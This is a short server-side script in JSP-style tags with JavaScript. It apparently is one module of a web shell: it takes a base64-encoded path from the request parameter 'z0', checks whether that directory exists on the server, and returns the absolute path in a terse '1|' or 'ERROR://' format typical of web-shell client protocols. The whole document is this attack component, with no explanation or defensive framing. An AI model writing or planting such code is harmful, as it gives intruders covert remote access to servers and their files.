<%
(function() {
    response.setContentType("text/html");
    response.setCharacterEncoding("UTF-8");

    var Paths = java.nio.file.Paths;
    var Files = java.nio.file.Files;

    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    var szDirPath = base64_decode(request.getParameter("z0"));

    if (!szDirPath) {
        output("ERROR://Cannot open directory.");
        return;
    }

    try {
        var path = Paths.get(szDirPath);

        if (Files.exists(path) && Files.isDirectory(path)) {
            var absolutePath = path.toAbsolutePath().normalize().toString();
            output("1|" + absolutePath);
        } else {
            output("ERROR://Cannot open directory.");
        }
    } catch (e) {
        output("ERROR://Cannot open directory.");
    }
})();
%>